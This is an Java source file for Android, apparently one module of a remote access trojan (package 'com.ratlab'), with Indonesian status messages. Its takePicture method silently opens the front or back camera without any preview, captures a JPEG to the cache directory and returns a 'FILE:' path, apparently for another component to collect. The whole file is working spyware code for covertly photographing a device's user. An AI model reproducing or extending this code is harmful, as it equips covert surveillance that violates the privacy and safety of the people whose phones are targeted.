package com.ratlab;

import android.annotation.SuppressLint;
import android.content.Context;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CaptureResult;
import android.hardware.camera2.TotalCaptureResult;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class CameraModule {

    private static final String TAG = "CameraModule";
    private final Context ctx;

    public CameraModule(Context ctx) {
        this.ctx = ctx;
    }

    @SuppressLint("MissingPermission")
    public String takePicture(boolean front) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String cameraId = null;
            for (String id : cm.getCameraIdList()) {
                android.hardware.camera2.CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer facing = ch.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT) {
                        cameraId = id; break;
                    }
                    if (!front && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                        cameraId = id; break;
                    }
                }
            }
            if (cameraId == null) return "Kamera tidak ditemukan";

            File out = new File(ctx.getCacheDir(), "cam_" + System.currentTimeMillis() + ".jpg");
            HandlerThread ht = new HandlerThread("cam");
            ht.start();
            Handler h = new Handler(ht.getLooper());

            final String finalCameraId = cameraId;
            ImageReader reader = ImageReader.newInstance(1280, 720, android.graphics.ImageFormat.JPEG, 1);
            final CameraDevice[] device = new CameraDevice[1];

            reader.setOnImageAvailableListener(r -> {
                try {
                    Image img = r.acquireLatestImage();
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buf.remaining()];
                    buf.get(bytes);
                    try (FileOutputStream fos = new FileOutputStream(out)) {
                        fos.write(bytes);
                    }
                    img.close();
                    if (device[0] != null) device[0].close();
                } catch (Exception e) {
                    Log.e(TAG, "save error: " + e.getMessage());
                }
            }, h);

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    device[0] = camera;
                    try {
                        CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        b.addTarget(reader.getSurface());
                        camera.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override public void onConfigured(CameraCaptureSession session) {
                                    try {
                                        session.capture(b.build(), new CameraCaptureSession.CaptureCallback() {
                                            @Override public void onCaptureCompleted(CameraCaptureSession s, CaptureRequest req, TotalCaptureResult res) {}
                                        }, h);
                                    } catch (Exception e) {}
                                }
                                @Override public void onConfigureFailed(CameraCaptureSession session) {}
                            }, h);
                    } catch (Exception e) {}
                }
                @Override public void onDisconnected(CameraDevice camera) {}
                @Override public void onError(CameraDevice camera, int error) {}
            }, h);

            Thread.sleep(3000);
            return out.exists() ? "FILE:" + out.getAbsolutePath() : "Gagal ambil foto";
        } catch (Exception e) {
            return "Error camera: " + e.getMessage();
        }
    }
}
